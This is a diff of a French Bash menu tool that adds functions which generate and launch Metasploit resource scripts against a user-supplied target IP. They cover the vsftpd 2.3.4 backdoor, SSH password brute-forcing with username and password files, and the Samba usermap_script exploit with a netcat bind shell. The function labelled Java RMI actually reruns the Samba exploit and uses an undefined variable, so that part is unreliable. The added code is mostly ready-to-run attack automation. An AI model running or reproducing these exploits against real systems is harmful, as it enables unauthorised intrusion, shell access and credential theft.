@@ -552,6 +552,7 @@ command_NetCat() {
 
 
 
+
 command_Automatisation() {
     tput clear
     tput cup 0 0
@@ -565,3 +566,159 @@ command_Automatisation() {
     echo
     read -p "[ENTER]"
 }
+
+
+function metasploit_vsftpd_exploit() {
+    # Demander à l'utilisateur l'adresse IP de la cible
+    read -p "Entrez l'adresse IP de la cible (RHOSTS): " TARGET_IP
+
+
+
+    # Génération du fichier de commandes pour msfconsole
+    MSF_SCRIPT="vsftpd_script.rc"
+    cat << EOF > $MSF_SCRIPT
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS $TARGET_IP
+exploit
+echo "Ecrivez exit pour sortir de msfconsole"
+EOF
+
+    # Exécute msfconsole avec le fichier de commandes généré
+    echo "Lancement de msfconsole avec le script..."
+    msfconsole -r $MSF_SCRIPT
+
+    # Nettoyage du fichier de script après exécution
+    rm -f $MSF_SCRIPT  
+}
+
+
+function attaque_ssh_metasploit() {
+    # Efface le terminal et affiche un titre
+    tput clear
+    echo "================================================"
+    echo "         Attaque SSH via Metasploit             "
+    echo "================================================"
+    echo
+
+    # Demande à l'utilisateur l'adresse IP de la cible
+    echo "Entrez l'adresse IP de la cible (RHOSTS) :"
+    read -p ">> " TARGET_IP
+
+    # Demande à l'utilisateur le chemin vers le fichier des noms d'utilisateur
+    echo "Entrez le chemin vers le fichier des noms d'utilisateur :"
+    read -p ">> " USER_FILE
+
+    # Vérifie que le fichier des noms d'utilisateur existe
+    if [[ ! -f "$USER_FILE" ]]; then
+        echo "Erreur : Le fichier des noms d'utilisateur spécifié n'existe pas."
+        return 1
+    fi
+
+    # Demande à l'utilisateur le chemin vers le fichier des mots de passe
+    echo "Entrez le chemin vers le fichier des mots de passe :"
+    read -p ">> " PASS_FILE
+
+    # Vérifie que le fichier des mots de passe existe
+    if [[ ! -f "$PASS_FILE" ]]; then
+        echo "Erreur : Le fichier des mots de passe spécifié n'existe pas."
+        return 1
+    fi
+
+    # Génération du fichier de commandes pour Metasploit
+    MSF_SCRIPT="attaque_ssh_script.rc"
+    cat << EOF > $MSF_SCRIPT
+use auxiliary/scanner/ssh/ssh_login
+setg RHOSTS $TARGET_IP
+set USER_FILE $USER_FILE
+set PASS_FILE $PASS_FILE
+exploit
+echo "Ecrivez exit pour sortir de msfconsole"
+EOF
+
+    # Exécute Metasploit avec le fichier de commandes généré
+    echo
+    echo "Lancement de Metasploit avec le script d'attaque SSH..."
+    msfconsole -r $MSF_SCRIPT
+
+    # Nettoie le fichier temporaire après l'exécution
+    rm -f $MSF_SCRIPT
+
+}
+
+function samba_usermap_exploit() {
+    # Efface le terminal et affiche un titre
+    tput clear
+    echo "================================================"
+    echo "       Exploitation Samba : usermap_script      "
+    echo "================================================"
+    echo
+
+    # Demande à l'utilisateur l'adresse IP de la cible
+    echo "Entrez l'adresse IP de la cible (RHOSTS) :"
+    read -p ">> " TARGET_IP
+
+    # Demande à l'utilisateur l'adresse IP de sa propre machine (LHOSTS)
+    echo "Entrez l'adresse IP de votre machine (LHOSTS) :"
+    read -p ">> " ATTACKER_IP
+
+    # Génération du script Metasploit
+    MSF_SCRIPT="samba_usermap_script.rc"
+    cat << EOF > $MSF_SCRIPT
+use exploit/multi/samba/usermap_script
+setg RHOSTS $TARGET_IP
+show payloads
+set payload cmd/unix/bind_netcat
+setg LHOSTS $ATTACKER_IP
+set LPORT 4444
+exploit
+echo "Ecrivez exit pour sortir de msfconsole"
+EOF
+
+    # Exécute Metasploit avec le script généré
+    echo
+    echo "Lancement de Metasploit avec le script d'exploitation Samba..."
+    msfconsole -r $MSF_SCRIPT
+
+    # Nettoyage : supprime le fichier temporaire après exécution
+    rm -f $MSF_SCRIPT
+
+  
+}
+
+    
+    function java_rmi_exploit() {
+    # Efface le terminal et affiche un titre
+    tput clear
+    echo "================================================"
+    echo "        Exploitation Java RMI Server           "
+    echo "================================================"
+    echo
+
+
+    # Demande à l'utilisateur l'adresse IP de la cible
+    echo "Entrez l'adresse IP de la cible (RHOSTS) :"
+    read -p ">> " TARGET_IP
+
+
+    # Génération du script Metasploit
+    MSF_SCRIPT="samba_usermap_script.rc"
+    cat << EOF > $MSF_SCRIPT
+use exploit/multi/samba/usermap_script
+setg RHOSTS $TARGET_IP
+set payload cmd/unix/bind_netcat
+setg LHOSTS $ATTACKER_IP
+set LPORT 4444
+exploit
+echo "Ecrivez exit pour sortir de msfconsole"
+EOF
+
+    # Exécute Metasploit avec le script généré
+    echo
+    echo "Lancement de Metasploit avec le script d'exploitation Samba..."
+    msfconsole -r $MSF_SCRIPT
+
+    # Nettoyage : supprime le fichier temporaire après exécution
+    rm -f $MSF_SCRIPT
+}
+
+
